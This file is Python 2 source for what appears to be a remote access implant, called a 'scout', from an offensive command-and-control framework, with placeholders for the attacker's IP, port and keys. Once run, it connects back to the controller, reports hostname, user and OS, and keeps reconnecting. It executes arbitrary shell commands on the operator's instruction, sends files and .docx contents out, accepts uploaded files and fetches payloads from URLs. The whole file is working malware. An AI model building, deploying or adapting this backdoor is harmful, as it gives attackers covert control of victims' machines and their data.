import subprocess, os, socket, re, pickle, docx, urllib2
from platform import platform
from getpass import getuser
from time import sleep
from datetime import datetime

port = !!!!!
ip_addr = @@@@@
lkey = #####
End = $$$$$
skey = %%%%%
time_to_sleep = ^^^^^
type_of_scout = 'Command Shell'
try:
    operating_sys = platform()
except:
    operating_sys = '?????'
try:
    hostname = socket.gethostname()
except:
    hostname = '?????'
try:
    username = getuser()
except:
    username = '?????'
userinfo = hostname + '/' + username
scout_data = [skey, lkey, userinfo, type_of_scout, operating_sys]
shell_type = '/bin/bash'
s = None

help_menu = '''\nCommand Shell Menu
==================

   Global Commands :
      banner                            Display a banner
      clear                             Clear the screen
      help                              Show the help menu
      local <shell command>             Locally execute a shell command
      python                            Enter the system python interpreter
      quit                              Quit the framework

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill the scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Handler commands :
      back                              Move back to scout handler

   Command Shell Commands :
      exec <shell command>              Executes shell command and returns output
      exec_file <shell command>         Executes a shell command with no output(use this to run files and avoid blocking)
      swap <shell path>                 Switch the type of shell used, default is "/bin/bash"

   File Commands :
      download <filepath>               Download file
      dump <filepath>                   Dump and view file content(supports .docx file)
      upload <filepath>                 Upload a file
      web_download <url>                Download a file through a url\n'''


def basename(filepath):
    basename = re.search(r'[^\\/]+(?=[\\/]?$)', filepath)
    if basename:
        return basename.group(0)

def recvall(tar_socket):
    tar_socket.settimeout(None)
    data = tar_socket.recv(9999)
    if not data:
        return ''
    while True:
        if data.endswith(End):
            try:
                tar_socket.settimeout(1)
                more_data = tar_socket.recv(9999)
                if not more_data:
                    return data[:-len(End)]
                data += more_data
            except (socket.timeout,socket.error):
                tar_socket.settimeout(None)
                return data[:-len(End)]
        else:
            more_data = tar_socket.recv(9999)
            data += more_data

def shell_execute(execute):
    if execute[:3] == 'cd ':
        try:
            execute = execute.replace('cd ', '')
            os.chdir(execute)
            s.sendall("[+]Changed to directory : " + execute + End)
        except:
            s.sendall('[-]Could not change to directory : ' + execute + End)
    else:
        try:
            result = subprocess.Popen(execute, shell=True, executable=shell_type, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()
            try:
                s.sendall(unicode(result + End))
            except:
                s.sendall(result + End)
        except:
            s.sendall('[-]Could not execute command' + End)


def file_execute(command):
    try:
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
        s.sendall('[+]Executed : ' + command + End)
    except Exception as e:
        s.sendall('[-]Error executing, "' + command + '" : ' + str(e) + End)


def upload_file(file_name, content):
    try:
        f = open(basename(file_name), 'wb')
        f.write(content)
        f.close()
        s.sendall('[+]Uploaded file successfully' + End)
    except Exception as e:
        s.sendall('[-]Error writing to file "' + file_name + '" : ' + str(e) + End)


def download_file(file_name):
    if os.path.isfile(file_name):
        try:
            f = open(file_name, 'rb')
            bin_data = f.read()
            f.close()
            s.sendall(file_name + '|/' + bin_data + End)
        except Exception as e:
            s.sendall('[-]Error reading from file "' + file_name + '" : ' + str(e) + End)
    else:
        s.sendall('[-]File path/name is not valid' + End)


def dump_file(file_name):
    try:
        if os.path.isfile(file_name):
            extension = basename(file_name).split('.')[-1]  #
            if extension == 'docx':
                try:
                    doc = docx.Document(file_name)
                    data = '\n\n'.join([paragraph.text.encode('utf-8') for paragraph in doc.paragraphs])
                    s.sendall(data + End)
                except Exception as e:
                    s.sendall('[-]Error reading "' + file_name + '" : ' + str(e) + End)
            else:
                try:
                    f = open(file_name, 'rb')
                    data = f.read()
                    f.close()
                    try:
                        s.sendall(unicode(data + End))
                    except:
                        try:
                            s.sendall(data + End)
                        except Exception as e:
                            s.sendall('[-]Error dumping file "' + basename(file_name) + '" : ' + str(e) + End)
                except Exception as e:
                    s.sendall('[-]Error reading "' + file_name + '" : ' + str(e) + End)
        else:
            s.sendall('[-]File path/name is not valid' + End)
    except Exception as e:
        s.sendall('[-]Error dumping file : ' + str(e) + End)


def download_from_web(url):
    try:
        url_data = url.split('/')[-1]
        file_name = urllib2.unquote(url_data)
        if file_name == '':
            file_name = datetime.now().strftime("%Y%m%d-%H%M%S")
        response = urllib2.urlopen(url)
        data = response.read()
        f = open(file_name, 'wb')
        f.write(data)
        f.close()
        s.sendall('[+]Downloaded : ' + url + ' -> ' + file_name + End)
    except Exception as e:
        s.sendall('[-]Error downloading file : ' + str(e) + End)


def main():
    global s, shell_type
    while True:
        while True:
            try:
                s = socket.socket()
                s.connect((ip_addr, port))
                break
            except:
                sleep(time_to_sleep)
                continue
        s.sendall(pickle.dumps(scout_data) + End)
        while True:
            try:
                #s.settimeout(None)
                data = recvall(s).split(' ', 1)
                command = data[0]
                if command == 'help':
                    s.sendall(help_menu + End)
                elif command == 'disconnect':
                    s.sendall('[*]Disconnecting...' + End)
                    sleep(5)
                    break
                elif command == 'terminate':
                    s.sendall('[*]Terminating scout...' + End)
                    os._exit(1)
                elif command == 'sleep':
                    try:
                        sleep_time = int(data[1])
                    except:
                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
                        continue
                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
                    s.shutdown(1)
                    s.close()
                    for i in range(sleep_time):
                        sleep(1)
                    break
                elif command == 'exec':
                    try:
                        execute = data[1]
                    except:
                        s.sendall('[-]Specify a command to execute' + End)
                        continue
                    shell_execute(execute)
                elif command == 'exec_file':
                    try:
                        execute = data[1]
                    except:
                        s.sendall('[-]Specify command/file to execute' + End)
                        continue
                    file_execute(execute)
                elif command == 'swap':
                    try:
                        shell_type = data[1]
                        s.sendall('[+]Current shell in use is : '+shell_type+End)
                    except:
                        s.sendall('[-]Specify a shell type'+End)
                elif command == 'download':
                    try:
                        file_name = data[1]
                    except:
                        s.sendall('[-]Specify file to download' + End)
                        continue
                    download_file(file_name)
                elif command == 'upload':
                    data = data[1].split('|/', 1)
                    file_name = data[0]
                    file_contents = data[1]
                    upload_file(file_name, file_contents)
                elif command == 'dump':
                    try:
                        file_target = data[1]
                    except:
                        s.sendall('[-]Specify file to dump contents of' + End)
                        continue
                    dump_file(file_target)
                elif command == 'web_download':
                    try:
                        download_from_web(data[1])
                    except IndexError:
                        s.sendall('[-]Specify URL to download from' + End)
                        continue
                    except Exception as e:
                        s.sendall('[-]Error downloading from url : ' + str(e) + End)
                        continue
                elif command == 'ping':
                    s.sendall('[+]Scout is alive' + End)
                else:
                    s.sendall('[-]Unknown command "' + command + '", run "help" for help menu' + End)
            except (socket.error, socket.timeout):
                try:
                    s.shutdown(1)
                    s.close()
                    break
                except socket.error:
                    break
            except Exception as e:
                try:
                    if command:
                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
                    else:
                        s.sendall('[-]Error message : ' + str(e) + End)
                except:
                    s.shutdown(1)
                    s.close()
                    break


main()
